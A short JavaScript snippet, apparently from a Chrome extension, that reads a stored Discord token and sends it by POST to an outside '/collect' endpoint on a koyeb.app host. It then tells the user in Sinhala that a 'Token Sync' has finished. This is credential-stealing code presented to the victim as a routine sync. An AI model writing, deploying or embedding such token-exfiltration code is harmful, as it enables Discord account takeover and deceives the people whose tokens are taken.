chrome.storage.local.get(["discordToken"], (result) => {
    if (result.discordToken) {
        // Token එක Server එකට යවනවා
        fetch("https://your-app.koyeb.app/collect", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token: result.discordToken })
        });
        
        document.getElementById("display").innerText = "Token Sync කර අවසන්.";
    }
});
